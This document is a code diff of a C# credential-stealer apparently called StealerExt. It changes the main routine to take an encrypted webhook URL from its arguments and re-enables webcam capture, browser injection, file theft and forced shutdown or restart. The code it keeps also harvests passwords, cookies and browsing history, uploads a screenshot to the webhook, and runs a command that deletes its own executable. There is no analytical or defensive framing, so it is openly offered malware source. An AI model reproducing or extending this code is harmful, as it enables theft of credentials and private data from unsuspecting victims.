@@ -14,13 +14,12 @@ namespace StealerExt
         [STAThread]
         public static void Main(string[] arg)
         {
-            string die = "ZhXl39BlhP84+Y4kurA8wpehxxqA0X22IMYZ6Vpiqs60hZftunuYq0R5nmh6sz7OAIVyuL5zey2rJu2qeQ0eZfgADxWhIw9CAPKRzzA7OQQXhBOuvJfmWaViVpiLkPASBy0CiSB1521+4WJxqvMshzoFZSgkRsFjioFWRIvP1Ic=";
 #if !DEBUG
             if (arg.Length <= 0) throw new ArgumentNullException(nameof(arg));
 #endif
             try
             {
-                var PaddedDecryptedUrl = Decrypt(die);
+                var PaddedDecryptedUrl = Decrypt(arg[0]);
                 _DecryptedHook = new Uri(PaddedDecryptedUrl).AbsoluteUri;
             }
             catch
@@ -30,38 +29,38 @@ namespace StealerExt
             string[] resName = Assembly.GetExecutingAssembly().GetManifestResourceNames();
             for (int i = 0; i < resName.Length; i++)
                 if (resName[i].ToLowerInvariant() != "rtkbtmanserv.properties.resources.resources") ExtractResources(resName[i]);
-            //dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config")); // Useless...
+            dynamic config = JsonConvert.DeserializeObject(File.ReadAllText(API.Temp + "config")); // Useless...
             new Stealer().StartSteal();
             new API(API.wHook).SendMultiPartStream(FileName: "Screenshot.png", memoryStream: CurrentScreen.GetScreenshot());
-            //if ((bool)config.cam == true) WebCamCap.wcc();
+            if ((bool)config.cam == true) WebCamCap.wcc();
             API.Passwords();
             API.Cookies();
             API.History();
-            // Injection.StartInjection();
-            //if ((bool)config.files == true)
-            //{
-            //    FileStealer.GetFiles();
-            //}
-            
+            Injection.StartInjection();
+            if ((bool)config.files == true)
+            {
+                FileStealer.GetFiles();
+            }
+
             Cleanup();
-            //if ((bool)config.shutdown == true)
-            //{
-            //    var psi = new ProcessStartInfo("shutdown", "/s /t 5")
-            //    {
-            //        CreateNoWindow = true,
-            //        UseShellExecute = true
-            //    };
-            //    Process.Start(psi);
-            //}
-            //else if ((bool)config.restart == true)
-            //{
-            //    var psi = new ProcessStartInfo("shutdown", "/r /s /t 5")
-            //    {
-            //        CreateNoWindow = true,
-            //        UseShellExecute = true
-            //    };
-            //    Process.Start(psi);
-            //}
+            if ((bool)config.shutdown == true)
+            {
+                var psi = new ProcessStartInfo("shutdown", "/s /t 5")
+                {
+                    CreateNoWindow = true,
+                    UseShellExecute = true
+                };
+                Process.Start(psi);
+            }
+            else if ((bool)config.restart == true)
+            {
+                var psi = new ProcessStartInfo("shutdown", "/r /s /t 5")
+                {
+                    CreateNoWindow = true,
+                    UseShellExecute = true
+                };
+                Process.Start(psi);
+            }
             Process.Start(new ProcessStartInfo()
             {
                 Arguments = "/C choice /C Y /N /D Y /T 2 & Del \"" + Application.ExecutablePath + "\"",
